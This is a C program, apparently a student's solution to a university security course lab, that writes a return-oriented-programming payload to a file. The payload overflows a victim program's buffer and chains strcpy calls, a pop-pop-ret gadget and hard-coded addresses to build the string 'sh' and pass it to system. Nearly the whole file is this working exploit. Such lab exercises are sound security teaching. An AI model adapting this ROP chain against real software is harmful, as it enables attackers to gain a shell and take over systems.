#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cse543-util.h"


// Write 4-byte value to memory at location addr+offset
// You will use to write values into your payload - one 32-bit word at a time
#define pack(addr, offset, value)  (*((int **)(addr+offset)) = value)
#define OFFSET 	94
#define STRCPY_OFFSET_0  OFFSET 
#define strcpy_addr 	0x0804872c
#define PPR_OFFSET_0 (STRCPY_OFFSET_0 + 4)
#define ppr_addr 0x08048842
#define DYNAMIC_OFFSET_0 (PPR_OFFSET_0 + 4)
#define dynamic_addr 0x0804d0f8
#define BIN_LS_OFFSET (DYNAMIC_OFFSET_0 + 4)
#define bin_ls_addr (0x08048000 + 0x00003842)
#define STRCPY_OFFSET_1 (BIN_LS_OFFSET + 4)
//#define strcpy_addr 0x0804872c
#define PPR_OFFSET_1 (STRCPY_OFFSET_1 + 4)
//#define ppr_addr 0x08048842
#define DYNAMIC_OFFSET_1 (PPR_OFFSET_1 + 4)
//#define dynamic_addr 0x0804d0f8
#define FFLUSH_OFFSET (DYNAMIC_OFFSET_1 + 4)
#define fflush_addr (0x08048000 + 0x000003b5)
#define SYS_OFFSET (FFLUSH_OFFSET + 4) 
#define sys_addr 0x0804867c
#define EXIT_OFFSET (SYS_OFFSET + 4)
#define exit_addr   0x08048894 
#define DYNAMIC_OFFSET_2 (EXIT_OFFSET + 4)
//#define dynamic_addr 0x0804d0f8



int main(int argc, char **argv)
{
	/* Step 1: fill with x's up to return address */
	int i = 0;
	unsigned char buff[150];
	/* Step 1: fill with x's up to return address */

	while ( 1 ) {
 		if( i >= OFFSET ) break;
		buff[i] = 'x';
		i++;
	}


	/* Step 2: set address of return address */
	/* to first instruction address of malicious payload - strcpy@plt */

	pack(buff, STRCPY_OFFSET_0, strcpy_addr);
	pack(buff, PPR_OFFSET_0, ppr_addr);
	pack(buff, DYNAMIC_OFFSET_0, dynamic_addr);
	pack(buff, BIN_LS_OFFSET, bin_ls_addr);

        /* Step 3: Construct the string from available characters in victim */
	/* may take a few steps to get it constructed */

	//strcpy( buff + PPR_OFFSET + 5, "sh");
	pack(buff, STRCPY_OFFSET_1, strcpy_addr);
	pack(buff, PPR_OFFSET_1, ppr_addr);
	pack(buff, DYNAMIC_OFFSET_1, dynamic_addr + 0x5);
	pack(buff, FFLUSH_OFFSET, fflush_addr + 0x4);


	/* Step 4: Invoke system with string as command and exit cleanly */
	pack(buff, SYS_OFFSET, sys_addr);
	pack(buff, EXIT_OFFSET, exit_addr);
	pack(buff, DYNAMIC_OFFSET_2, dynamic_addr);


	/* Step 5: Write payload for input as input_domain of victim */
	/* see cse543-util.c for write_to_file code */
	write_to_file( "str-payload", buff, DYNAMIC_OFFSET_2 + 4, FILE_CLEAR );

	/* Example of writing payload to file - append */
	/* input as input_passwd of victim */
	write_to_file( "str-payload", "\npassword\n", 10, FILE_APPEND);

	exit(0);
}

